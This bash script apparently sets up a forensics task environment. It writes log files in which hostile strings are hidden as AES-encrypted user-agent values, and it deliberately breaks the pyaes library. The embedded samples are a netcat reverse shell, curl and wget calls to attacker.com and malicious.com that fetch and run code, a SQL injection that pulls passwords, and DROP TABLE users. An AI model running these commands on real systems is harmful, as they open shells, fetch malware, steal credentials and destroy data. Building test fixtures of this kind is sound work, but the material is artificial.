#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip curl
    pip3 install pytest cryptography

    # Generate corpora
    mkdir -p /app/corpora/clean
    mkdir -p /app/corpora/evil

    cat << 'EOF' > /tmp/gen_corpora.py
import os
import binascii
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)

# The prompt says "ForensicsTaskKey123! (16 bytes)", so we truncate to 16 bytes.
key = b"ForensicsTaskKey123!"[:16]
backend = default_backend()

clean_payloads = [
    b"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    b"Mozilla/5.0 (X11; Linux x86_64)",
    b"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    b"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
]

evil_payloads = [
    b"/bin/sh -c 'nc -e /bin/sh 10.0.0.1 4444'",
    b"UNION SELECT username, password FROM users--",
    b"curl http://attacker.com/payload.sh | bash",
    b"wget http://malicious.com/malware.bin -O /tmp/malware",
    b"DROP TABLE users;"
]

for i, p in enumerate(clean_payloads):
    with open(f"/app/corpora/clean/clean_{i+1}.log", "w") as f:
        f.write(f'192.168.1.100 - - [10/Oct/2023:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 1024 "-" "{p.decode()}"\n')

for i, p in enumerate(evil_payloads):
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=backend)
    encryptor = cipher.encryptor()
    ct = encryptor.update(pad(p)) + encryptor.finalize()
    hex_ct = binascii.hexlify(ct).decode()
    with open(f"/app/corpora/evil/evil_{i+1}.log", "w") as f:
        f.write(f'192.168.1.101 - - [10/Oct/2023:14:00:00 -0700] "GET /images/logo.png HTTP/1.1" 200 4096 "-" "{hex_ct}"\n')
EOF
    python3 /tmp/gen_corpora.py

    # Install pyaes to /app/pyaes-1.6.1
    pip3 install pyaes==1.6.1 -t /app/pyaes-1.6.1

    # Break the pyaes package
    cat << 'EOF' > /tmp/break_pyaes.py
aes_path = "/app/pyaes-1.6.1/pyaes/aes.py"
with open(aes_path, "r") as f:
    lines = f.readlines()

# Replace line 84 (index 83) with the broken code
lines[83] = "        return (x + y)  # BROKEN\n"

with open(aes_path, "w") as f:
    f.writelines(lines)
EOF
    python3 /tmp/break_pyaes.py

    # Clean up
    rm /tmp/gen_corpora.py /tmp/break_pyaes.py

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
